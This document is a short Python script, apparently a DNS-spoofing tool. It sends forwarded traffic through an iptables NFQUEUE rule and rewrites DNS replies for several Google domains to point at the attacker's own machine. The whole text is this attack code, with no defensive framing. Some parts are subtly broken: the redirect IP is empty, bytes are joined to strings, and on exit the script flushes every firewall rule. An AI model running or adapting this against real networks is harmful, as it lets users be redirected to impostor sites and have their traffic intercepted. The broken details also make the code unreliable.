import os
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from netfilterqueue import NetfilterQueue

self_ip = ""

dns_hosts = {
	b"google.nl" : self_ip,
	b'www.google.nl' : self_ip,
	b'google.com' : self_ip,
	b'www.google.com' : self_ip
}


def modify_dns_packet(packet):
	qname = packet[DNSQR].qname
	if qname not in dns_hosts:
		print("DNS packet not in hostname dict: " + qname)
		return packet

	packet[DNS].an = DNSRR(rrname=qname, rdata=self_ip)

	packet[DNS].ancount = 1

	del packet[IP].len
	del packet[UDP].len
	del packet[IP].chksum
	del packet[UDP].chksum
	print("DNS packet modified: " + qname)
	return packet


def process_dns_packet(packet):
	scapy_packet = IP(packet.get_payload())
	if scapy_packet.haslayer(DNSQR):
		print("Before: " + scapy_packet.summary())
		try:
			scapy_packet = modify_dns_packet(scapy_packet)
		except IndexError:
			pass
		print("After: " + scapy_packet.summary())
		packet.set_payload(bytes(scapy_packet))
	packet.accept()


if __name__ == "__main__":
	queue_number = 1

	os.system("iptables -I FORWARD -j NFQUEUE --queue-num " + str(queue_number))

	queue = NetfilterQueue()

	try:
		queue.bind(queue_number, process_dns_packet)
		queue.run()
	except KeyboardInterrupt:
		os.system("iptables --flush")
